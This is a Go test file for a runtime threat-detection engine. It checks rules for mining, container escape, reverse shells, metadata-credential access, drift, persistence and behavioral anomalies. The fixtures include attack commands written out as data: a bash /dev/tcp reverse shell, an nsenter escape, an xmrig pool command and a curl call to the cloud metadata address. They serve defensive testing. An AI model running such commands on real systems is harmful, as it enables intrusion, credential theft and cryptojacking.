package runtime

import (
	"context"
	"strings"
	"testing"
	"time"
)

func TestDetectionEngine_ProcessEvent(t *testing.T) {
	engine := NewDetectionEngine()

	tests := []struct {
		name           string
		event          *RuntimeEvent
		wantFindings   int
		wantCategories []DetectionCategory
	}{
		{
			name: "crypto mining process",
			event: &RuntimeEvent{
				ID:        "test-1",
				Timestamp: time.Now(),
				EventType: "process",
				Process: &ProcessEvent{
					Name:    "xmrig",
					Cmdline: "xmrig --pool stratum://pool.example.com",
				},
			},
			wantFindings:   1,
			wantCategories: []DetectionCategory{CategoryCryptoMining},
		},
		{
			name: "container escape nsenter",
			event: &RuntimeEvent{
				ID:        "test-2",
				Timestamp: time.Now(),
				EventType: "process",
				Process: &ProcessEvent{
					Name:    "nsenter",
					Cmdline: "nsenter -t 1 -m -u -i -n",
				},
				Container: &ContainerEvent{
					ContainerID: "abc123",
				},
			},
			wantFindings:   1,
			wantCategories: []DetectionCategory{CategoryContainerEscape},
		},
		{
			name: "reverse shell bash",
			event: &RuntimeEvent{
				ID:        "test-3",
				Timestamp: time.Now(),
				EventType: "process",
				Process: &ProcessEvent{
					Name:    "bash",
					Cmdline: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
				},
			},
			wantFindings:   1,
			wantCategories: []DetectionCategory{CategoryReverseShell},
		},
		{
			name: "imds access",
			event: &RuntimeEvent{
				ID:        "test-4",
				Timestamp: time.Now(),
				EventType: "network",
				Process: &ProcessEvent{
					Name: "curl",
				},
				Network: &NetworkEvent{
					DstIP:   "169.254.169.254",
					DstPort: 80,
				},
			},
			wantFindings:   1,
			wantCategories: []DetectionCategory{CategoryCredentialAccess},
		},
		{
			name: "legitimate process",
			event: &RuntimeEvent{
				ID:        "test-5",
				Timestamp: time.Now(),
				EventType: "process",
				Process: &ProcessEvent{
					Name:    "nginx",
					Cmdline: "nginx: worker process",
				},
			},
			wantFindings:   0,
			wantCategories: nil,
		},
		{
			name: "container drift new binary",
			event: &RuntimeEvent{
				ID:        "test-6",
				Timestamp: time.Now(),
				EventType: "file",
				File: &FileEvent{
					Operation: "create",
					Path:      "/usr/bin/malware.elf",
				},
				Container: &ContainerEvent{
					ContainerID: "abc123",
				},
			},
			wantFindings:   1,
			wantCategories: []DetectionCategory{CategoryContainerDrift},
		},
		{
			name: "ssh keys modified",
			event: &RuntimeEvent{
				ID:        "test-7",
				Timestamp: time.Now(),
				EventType: "file",
				File: &FileEvent{
					Operation: "modify",
					Path:      "/root/.ssh/authorized_keys",
				},
			},
			wantFindings:   1,
			wantCategories: []DetectionCategory{CategoryPersistence},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := engine.ProcessEvent(context.Background(), tt.event)

			if len(findings) != tt.wantFindings {
				t.Errorf("got %d findings, want %d", len(findings), tt.wantFindings)
			}

			for i, cat := range tt.wantCategories {
				if i < len(findings) && findings[i].Category != cat {
					t.Errorf("finding %d category = %s, want %s", i, findings[i].Category, cat)
				}
			}
		})
	}
}

func TestDetectionEngine_ListRules(t *testing.T) {
	engine := NewDetectionEngine()
	rules := engine.ListRules()

	if len(rules) == 0 {
		t.Error("expected default rules to be loaded")
	}

	// Check for critical rule categories
	categories := make(map[DetectionCategory]bool)
	for _, rule := range rules {
		categories[rule.Category] = true
	}

	requiredCategories := []DetectionCategory{
		CategoryCryptoMining,
		CategoryContainerEscape,
		CategoryReverseShell,
		CategoryLateralMovement,
		CategoryCredentialAccess,
	}

	for _, cat := range requiredCategories {
		if !categories[cat] {
			t.Errorf("missing rules for category: %s", cat)
		}
	}
}

func TestDetectionEngine_Suppression(t *testing.T) {
	engine := NewDetectionEngine()

	// Get a rule ID
	rules := engine.ListRules()
	if len(rules) == 0 {
		t.Skip("no rules loaded")
	}

	ruleID := rules[0].ID

	// Set suppression
	engine.SetSuppression(ruleID, true)

	// Create event that would trigger the rule
	event := &RuntimeEvent{
		ID:        "test-suppressed",
		Timestamp: time.Now(),
		EventType: "process",
		Process: &ProcessEvent{
			Name:    "xmrig",
			Cmdline: "xmrig",
		},
	}

	findings := engine.ProcessEvent(context.Background(), event)

	// Check that findings are marked as suppressed
	for _, f := range findings {
		if f.RuleID == ruleID && !f.Suppressed {
			t.Error("expected finding to be marked as suppressed")
		}
	}
}

func TestDetectionEngineProcessEventPreservesObservationForSparseLegacyEvents(t *testing.T) {
	engine := NewDetectionEngine()
	findings := engine.ProcessEvent(context.Background(), &RuntimeEvent{
		ID:        "legacy-1",
		Timestamp: time.Now(),
		EventType: "process",
		Process: &ProcessEvent{
			Name:    "xmrig",
			Cmdline: "xmrig --pool stratum://pool.example.com",
		},
	})
	if len(findings) != 1 {
		t.Fatalf("len(findings) = %d, want 1", len(findings))
	}
	if findings[0].Observation == nil {
		t.Fatal("expected finding observation")
	}
	if findings[0].Observation.Process == nil || findings[0].Observation.Process.Name != "xmrig" {
		t.Fatalf("finding observation process = %#v", findings[0].Observation.Process)
	}
}

func TestDetectionEngineProcessNormalizedObservation(t *testing.T) {
	engine := NewDetectionEngine()
	observation, err := NormalizeObservation(&RuntimeObservation{
		ID:         "obs-1",
		Kind:       ObservationKindProcessExec,
		Source:     "tetragon",
		ObservedAt: time.Now(),
		Process: &ProcessEvent{
			Name:    "xmrig",
			Cmdline: "xmrig --pool stratum://pool.example.com",
		},
		Container: &ContainerEvent{
			ContainerID: "ctr-1",
		},
	})
	if err != nil {
		t.Fatalf("NormalizeObservation: %v", err)
	}

	findings := engine.ProcessNormalizedObservation(context.Background(), observation)
	if len(findings) != 1 {
		t.Fatalf("len(findings) = %d, want 1", len(findings))
	}
	if findings[0].Observation == nil || findings[0].Observation.ID != observation.ID {
		t.Fatalf("finding observation = %#v, want normalized observation id %q", findings[0].Observation, observation.ID)
	}
}

func TestDetectionEngineBehaviorProfilesLearnWithoutFindings(t *testing.T) {
	engine := NewDetectionEngine()
	base := time.Date(2026, 3, 17, 12, 0, 0, 0, time.UTC)

	findings := engine.ProcessObservation(context.Background(), &RuntimeObservation{
		ID:          "obs-learn-1",
		Kind:        ObservationKindProcessExec,
		Source:      "tetragon",
		ObservedAt:  base,
		WorkloadRef: "deployment:prod/api",
		Process: &ProcessEvent{
			Name: "nginx",
			Path: "/usr/sbin/nginx",
		},
	})
	if len(findings) != 0 {
		t.Fatalf("len(findings) = %d, want 0 during learning mode", len(findings))
	}
}

func TestDetectionEngineBehaviorProfilesKnownProcessDoesNotAlertAfterLearning(t *testing.T) {
	engine := NewDetectionEngine()
	base := time.Date(2026, 3, 17, 12, 0, 0, 0, time.UTC)

	engine.ProcessObservation(context.Background(), &RuntimeObservation{
		ID:          "obs-known-1",
		Kind:        ObservationKindProcessExec,
		Source:      "tetragon",
		ObservedAt:  base,
		WorkloadRef: "deployment:prod/api",
		Process: &ProcessEvent{
			Name: "nginx",
			Path: "/usr/sbin/nginx",
		},
	})

	findings := engine.ProcessObservation(context.Background(), &RuntimeObservation{
		ID:          "obs-known-2",
		Kind:        ObservationKindProcessExec,
		Source:      "tetragon",
		ObservedAt:  base.Add(25 * time.Hour),
		WorkloadRef: "deployment:prod/api",
		Process: &ProcessEvent{
			Name: "nginx",
			Path: "/usr/sbin/nginx",
		},
	})
	if len(findings) != 0 {
		t.Fatalf("len(findings) = %d, want 0 for learned process", len(findings))
	}
}

func TestDetectionEngineBehaviorProfilesDetectNovelProcessAfterLearning(t *testing.T) {
	engine := NewDetectionEngine()
	base := time.Date(2026, 3, 17, 12, 0, 0, 0, time.UTC)

	engine.ProcessObservation(context.Background(), &RuntimeObservation{
		ID:          "obs-novel-1",
		Kind:        ObservationKindProcessExec,
		Source:      "tetragon",
		ObservedAt:  base,
		WorkloadRef: "deployment:prod/api",
		Process: &ProcessEvent{
			Name: "nginx",
			Path: "/usr/sbin/nginx",
		},
	})

	findings := engine.ProcessObservation(context.Background(), &RuntimeObservation{
		ID:          "obs-novel-2",
		Kind:        ObservationKindProcessExec,
		Source:      "tetragon",
		ObservedAt:  base.Add(25 * time.Hour),
		WorkloadRef: "deployment:prod/api",
		Process: &ProcessEvent{
			Name: "bash",
			Path: "/bin/bash",
		},
	})
	if len(findings) != 1 {
		t.Fatalf("len(findings) = %d, want 1", len(findings))
	}
	if findings[0].Category != CategoryBehavioralAnomaly {
		t.Fatalf("category = %s, want %s", findings[0].Category, CategoryBehavioralAnomaly)
	}
	if findings[0].Severity != "high" {
		t.Fatalf("severity = %s, want high", findings[0].Severity)
	}
	if findings[0].Observation == nil || findings[0].Observation.WorkloadRef != "deployment:prod/api" {
		t.Fatalf("observation = %#v, want workload-backed finding", findings[0].Observation)
	}
	if !strings.Contains(findings[0].Description, "process_name=bash") {
		t.Fatalf("description = %q, want novel process signal", findings[0].Description)
	}
}

func TestDetectionEngineBehaviorProfilesDetectNovelNetworkSignalsAfterLearning(t *testing.T) {
	engine := NewDetectionEngine()
	base := time.Date(2026, 3, 17, 12, 0, 0, 0, time.UTC)

	engine.ProcessObservation(context.Background(), &RuntimeObservation{
		ID:          "obs-net-1",
		Kind:        ObservationKindNetworkFlow,
		Source:      "tetragon",
		ObservedAt:  base,
		WorkloadRef: "deployment:prod/api",
		Network: &NetworkEvent{
			DstIP:   "10.0.0.10",
			DstPort: 443,
			Domain:  "api.internal",
		},
	})

	findings := engine.ProcessObservation(context.Background(), &RuntimeObservation{
		ID:          "obs-net-2",
		Kind:        ObservationKindNetworkFlow,
		Source:      "tetragon",
		ObservedAt:  base.Add(25 * time.Hour),
		WorkloadRef: "deployment:prod/api",
		Network: &NetworkEvent{
			DstIP:   "10.0.0.99",
			DstPort: 5432,
			Domain:  "db.internal",
		},
	})
	if len(findings) != 1 {
		t.Fatalf("len(findings) = %d, want 1", len(findings))
	}
	if findings[0].Category != CategoryBehavioralAnomaly {
		t.Fatalf("category = %s, want %s", findings[0].Category, CategoryBehavioralAnomaly)
	}
	if findings[0].Severity != "high" {
		t.Fatalf("severity = %s, want high", findings[0].Severity)
	}
	if !strings.Contains(findings[0].Description, "network_dest=10.0.0.99:5432") {
		t.Fatalf("description = %q, want novel network destination", findings[0].Description)
	}
	if !strings.Contains(findings[0].Description, "dns_domain=db.internal") {
		t.Fatalf("description = %q, want novel DNS domain", findings[0].Description)
	}
}

func TestDetectionEngineBehaviorProfilesDetectNovelFileAfterLearning(t *testing.T) {
	engine := NewDetectionEngine()
	base := time.Date(2026, 3, 17, 12, 0, 0, 0, time.UTC)

	engine.ProcessObservation(context.Background(), &RuntimeObservation{
		ID:          "obs-file-1",
		Kind:        ObservationKindFileWrite,
		Source:      "tetragon",
		ObservedAt:  base,
		WorkloadRef: "deployment:prod/api",
		File: &FileEvent{
			Operation: "modify",
			Path:      "/var/log/app.log",
		},
	})

	findings := engine.ProcessObservation(context.Background(), &RuntimeObservation{
		ID:          "obs-file-2",
		Kind:        ObservationKindFileWrite,
		Source:      "tetragon",
		ObservedAt:  base.Add(25 * time.Hour),
		WorkloadRef: "deployment:prod/api",
		File: &FileEvent{
			Operation: "create",
			Path:      "/tmp/dropper.sh",
		},
	})
	if len(findings) != 1 {
		t.Fatalf("len(findings) = %d, want 1", len(findings))
	}
	if findings[0].Category != CategoryBehavioralAnomaly {
		t.Fatalf("category = %s, want %s", findings[0].Category, CategoryBehavioralAnomaly)
	}
	if findings[0].Severity != "medium" {
		t.Fatalf("severity = %s, want medium", findings[0].Severity)
	}
	if !strings.Contains(findings[0].Description, "file_path=/tmp/dropper.sh") {
		t.Fatalf("description = %q, want novel file path", findings[0].Description)
	}
}

func TestDetectionEngineBehaviorProfilesDetectRateSpikeAfterLearning(t *testing.T) {
	engine := NewDetectionEngine()
	engine.behaviorProfileCfg.rateAlertMultiplier = 3
	base := time.Date(2026, 3, 17, 12, 0, 0, 0, time.UTC)

	engine.ProcessObservation(context.Background(), &RuntimeObservation{
		ID:          "obs-rate-learn",
		Kind:        ObservationKindProcessExec,
		Source:      "tetragon",
		ObservedAt:  base,
		WorkloadRef: "deployment:prod/api",
		Process: &ProcessEvent{
			Name: "nginx",
			Path: "/usr/sbin/nginx",
		},
	})

	var findings []RuntimeFinding
	for i := 0; i < 3; i++ {
		findings = engine.ProcessObservation(context.Background(), &RuntimeObservation{
			ID:          "obs-rate-" + itoa(i+1),
			Kind:        ObservationKindProcessExec,
			Source:      "tetragon",
			ObservedAt:  base.Add(25 * time.Hour).Add(time.Duration(i) * time.Second),
			WorkloadRef: "deployment:prod/api",
			Process: &ProcessEvent{
				Name: "nginx",
				Path: "/usr/sbin/nginx",
			},
		})
	}
	if len(findings) != 1 {
		t.Fatalf("len(findings) = %d, want 1 on rate spike", len(findings))
	}
	if findings[0].Category != CategoryBehavioralAnomaly {
		t.Fatalf("category = %s, want %s", findings[0].Category, CategoryBehavioralAnomaly)
	}
	if !strings.Contains(findings[0].Description, "process_rate") {
		t.Fatalf("description = %q, want process_rate spike", findings[0].Description)
	}
}

func TestDetectionEngineBehaviorProfilesOutOfOrderEventDoesNotResetRateBucket(t *testing.T) {
	engine := NewDetectionEngine()
	engine.behaviorProfileCfg.rateAlertMultiplier = 3
	base := time.Date(2026, 3, 17, 12, 0, 0, 0, time.UTC)

	engine.ProcessObservation(context.Background(), &RuntimeObservation{
		ID:          "obs-rate-learn-ooo",
		Kind:        ObservationKindProcessExec,
		Source:      "tetragon",
		ObservedAt:  base,
		WorkloadRef: "deployment:prod/api",
		Process: &ProcessEvent{
			Name: "nginx",
			Path: "/usr/sbin/nginx",
		},
	})

	for i := 0; i < 2; i++ {
		findings := engine.ProcessObservation(context.Background(), &RuntimeObservation{
			ID:          "obs-rate-current-ooo-" + itoa(i+1),
			Kind:        ObservationKindProcessExec,
			Source:      "tetragon",
			ObservedAt:  base.Add(25 * time.Hour).Add(time.Duration(i) * time.Second),
			WorkloadRef: "deployment:prod/api",
			Process: &ProcessEvent{
				Name: "nginx",
				Path: "/usr/sbin/nginx",
			},
		})
		if len(findings) != 0 {
			t.Fatalf("len(findings) before threshold = %d, want 0", len(findings))
		}
	}

	staleFindings := engine.ProcessObservation(context.Background(), &RuntimeObservation{
		ID:          "obs-rate-stale-ooo",
		Kind:        ObservationKindProcessExec,
		Source:      "falco",
		ObservedAt:  base.Add(10 * time.Second),
		WorkloadRef: "deployment:prod/api",
		Process: &ProcessEvent{
			Name: "nginx",
			Path: "/usr/sbin/nginx",
		},
	})
	if len(staleFindings) != 0 {
		t.Fatalf("len(findings) for stale event = %d, want 0", len(staleFindings))
	}

	findings := engine.ProcessObservation(context.Background(), &RuntimeObservation{
		ID:          "obs-rate-trigger-ooo",
		Kind:        ObservationKindProcessExec,
		Source:      "tetragon",
		ObservedAt:  base.Add(25*time.Hour + 2*time.Second),
		WorkloadRef: "deployment:prod/api",
		Process: &ProcessEvent{
			Name: "nginx",
			Path: "/usr/sbin/nginx",
		},
	})
	if len(findings) != 1 {
		t.Fatalf("len(findings) after stale event = %d, want 1", len(findings))
	}
	if !strings.Contains(findings[0].Description, "process_rate") {
		t.Fatalf("description = %q, want process_rate spike", findings[0].Description)
	}
}

func TestDetectionEngineBehaviorProfilesEvictLeastRecentlyUsed(t *testing.T) {
	engine := NewDetectionEngine()
	engine.behaviorProfileCfg.maxProfiles = 2
	base := time.Date(2026, 3, 17, 12, 0, 0, 0, time.UTC)

	workloads := []string{"deployment:prod/a", "deployment:prod/b", "deployment:prod/a", "deployment:prod/c"}
	for i, workload := range workloads {
		engine.ProcessObservation(context.Background(), &RuntimeObservation{
			ID:          "obs-evict-" + itoa(i+1),
			Kind:        ObservationKindProcessExec,
			Source:      "tetragon",
			ObservedAt:  base.Add(time.Duration(i) * time.Minute),
			WorkloadRef: workload,
			Process: &ProcessEvent{
				Name: "nginx",
				Path: "/usr/sbin/nginx",
			},
		})
	}

	engine.mu.RLock()
	defer engine.mu.RUnlock()
	if got := len(engine.behaviorProfiles); got != 2 {
		t.Fatalf("len(behaviorProfiles) = %d, want 2", got)
	}
	if _, ok := engine.behaviorProfiles["deployment:prod/b"]; ok {
		t.Fatal("expected least recently used workload profile to be evicted")
	}
}

func TestDetectionEngineCandidateRulesForEventSkipsStrictlyRequiredDomains(t *testing.T) {
	engine := &DetectionEngine{
		suppressions:   make(map[string]bool),
		recentFindings: make([]RuntimeFinding, 0),
		maxFindings:    100,
	}
	engine.AddRule(DetectionRule{
		ID:      "process-only",
		Enabled: true,
		Conditions: []Condition{
			{Field: "process.name", Operator: "eq", Value: "bash"},
		},
	})
	engine.AddRule(DetectionRule{
		ID:      "network-only",
		Enabled: true,
		Conditions: []Condition{
			{Field: "network.dst_port", Operator: "eq", Value: "443"},
		},
	})
	engine.AddRule(DetectionRule{
		ID:      "process-and-container",
		Enabled: true,
		Conditions: []Condition{
			{Field: "process.name", Operator: "eq", Value: "bash"},
			{Field: "container.container_id", Operator: "neq", Value: ""},
		},
	})
	engine.AddRule(DetectionRule{
		ID:      "network-and-process-neq",
		Enabled: true,
		Conditions: []Condition{
			{Field: "network.dst_port", Operator: "eq", Value: "22"},
			{Field: "process.name", Operator: "neq", Value: "ssh"},
		},
	})
	engine.AddRule(DetectionRule{
		ID:      "network-and-process-eq",
		Enabled: true,
		Conditions: []Condition{
			{Field: "network.dst_port", Operator: "eq", Value: "22"},
			{Field: "process.name", Operator: "eq", Value: "ssh"},
		},
	})

	candidates := engine.candidateRulesForEvent(&RuntimeEvent{
		ID:        "evt-1",
		Timestamp: time.Now(),
		Network:   &NetworkEvent{DstPort: 22},
	})

	got := make(map[string]bool, len(candidates))
	for _, candidate := range candidates {
		got[candidate.ID] = true
	}

	if !got["network-only"] {
		t.Fatal("expected network-only rule to remain a candidate")
	}
	if !got["network-and-process-neq"] {
		t.Fatal("expected cross-domain neq rule to remain a candidate on partial events")
	}
	if got["process-only"] {
		t.Fatal("did not expect process-only rule for network-only event")
	}
	if got["process-and-container"] {
		t.Fatal("did not expect process-and-container rule for network-only event")
	}
	if got["network-and-process-eq"] {
		t.Fatal("did not expect cross-domain eq rule without process data")
	}
}

func TestDetectionEngineProcessEventKeepsPartialDomainNeqCoverage(t *testing.T) {
	engine := &DetectionEngine{
		suppressions:   make(map[string]bool),
		recentFindings: make([]RuntimeFinding, 0),
		maxFindings:    100,
	}
	engine.AddRule(DetectionRule{
		ID:       "lateral-movement-ssh-unusual",
		Name:     "Unusual SSH Connection",
		Category: CategoryLateralMovement,
		Severity: "medium",
		Enabled:  true,
		Conditions: []Condition{
			{Field: "network.dst_port", Operator: "eq", Value: "22"},
			{Field: "process.name", Operator: "neq", Value: "ssh"},
		},
	})

	findings := engine.ProcessEvent(context.Background(), &RuntimeEvent{
		ID:        "evt-ssh",
		Timestamp: time.Now(),
		Network:   &NetworkEvent{DstPort: 22},
	})

	if len(findings) != 1 {
		t.Fatalf("len(findings) = %d, want 1", len(findings))
	}
	if findings[0].RuleID != "lateral-movement-ssh-unusual" {
		t.Fatalf("finding rule id = %q, want lateral-movement-ssh-unusual", findings[0].RuleID)
	}
}

func TestDetectionEngineAddRulePrecompilesRegexConditions(t *testing.T) {
	engine := &DetectionEngine{
		suppressions:   make(map[string]bool),
		recentFindings: make([]RuntimeFinding, 0),
		maxFindings:    100,
	}

	engine.AddRule(DetectionRule{
		ID:      "regex-rule",
		Enabled: true,
		Conditions: []Condition{
			{Field: "process.name", Operator: "regex", Value: "^bash$"},
		},
	})

	if len(engine.rules) != 1 {
		t.Fatalf("len(engine.rules) = %d, want 1", len(engine.rules))
	}
	if engine.rules[0].Conditions[0].compiledRegex == nil {
		t.Fatal("expected regex condition to be compiled during rule registration")
	}
}

func BenchmarkDetectionEngineProcessNormalizedObservationProcessOnly(b *testing.B) {
	engine := NewDetectionEngine()
	observation, err := NormalizeObservation(&RuntimeObservation{
		ID:         "bench-process",
		Kind:       ObservationKindProcessExec,
		Source:     "tetragon",
		ObservedAt: time.Now(),
		Process: &ProcessEvent{
			Name:    "nginx",
			Cmdline: "nginx: worker process",
		},
	})
	if err != nil {
		b.Fatalf("NormalizeObservation: %v", err)
	}

	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = engine.ProcessNormalizedObservation(context.Background(), observation)
	}
}

func BenchmarkDetectionEngineProcessNormalizedObservationFileOnly(b *testing.B) {
	engine := NewDetectionEngine()
	observation, err := NormalizeObservation(&RuntimeObservation{
		ID:         "bench-file",
		Kind:       ObservationKindFileWrite,
		Source:     "tetragon",
		ObservedAt: time.Now(),
		File: &FileEvent{
			Operation: "modify",
			Path:      "/tmp/app.log",
		},
	})
	if err != nil {
		b.Fatalf("NormalizeObservation: %v", err)
	}

	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = engine.ProcessNormalizedObservation(context.Background(), observation)
	}
}
